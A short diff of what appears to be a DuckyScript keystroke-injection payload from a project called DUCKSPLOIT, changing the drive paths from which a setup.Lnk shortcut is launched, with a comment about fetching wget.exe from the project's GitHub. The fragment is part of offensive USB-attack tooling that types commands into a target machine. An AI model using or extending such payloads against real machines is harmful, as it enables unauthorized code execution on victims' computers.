@@ -6,10 +6,10 @@ ENTER
 DELAY 1000
 ENTER
 REM get wget https://github.com/canarddu38/DUCKSPLOIT/blob/root/CLIENT/wget.exe?raw=true
-STRING call F:/copy/scripts/setup.Lnk
+STRING call F:/client/scripts/setup.Lnk
 ENTER
 DELAY 500
-STRING call E:/copy/scripts/setup.Lnk
+STRING call E:/client/scripts/setup.Lnk
 ENTER
 DELAY 1500
 LEFTARROW
